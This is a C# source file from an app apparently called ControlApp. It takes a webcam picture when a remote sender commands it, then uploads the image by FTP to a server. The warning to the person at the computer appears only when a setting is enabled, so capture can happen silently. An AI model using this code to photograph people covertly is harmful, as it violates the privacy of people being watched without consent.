using System.Configuration;
using ControlApp.Subroutines;
using Emgu.CV;

namespace ControlApp.Commands;

public class WebcamCommand(string content) : Command(Type.Webcam, content) {
    public override void Execute(string senderId) {   
        if (Utils.CheckEnabled("WebCnt")) {
            new CustomMessage("Taking webcam picture in 5 seconds...", "", 5, false).Show();
        }
        string filename = "web" + MainWindow.username + senderId + DateTime.Now.ToString("yyyy-MM-dd") + ".jpg";
        string filePath = Path.Join(ConfigurationManager.AppSettings["LocalDrive"], filename);
        try {
            using VideoCapture capture = new VideoCapture();
            using Bitmap image = capture.QueryFrame().ToBitmap();
            new Bitmap(image, new Size(Convert.ToUInt16(image.Width / 1.5), Convert.ToUInt16(image.Height / 1.5))).Save(filePath);
        } catch (Exception ex) {
            Utils.LogError("Error getting webcam image: " + ex.Message);
            return;
        }
        if (ServerCommunicator.SendFtpFile(filePath)) {
            ServerCommunicator.SendCommand(senderId, Utils.Encrypt("U=FTP" + filename), false);
        } else {
            Utils.LogError("Webcam image taken, but not sent due to connectivity error");
        }
    }
}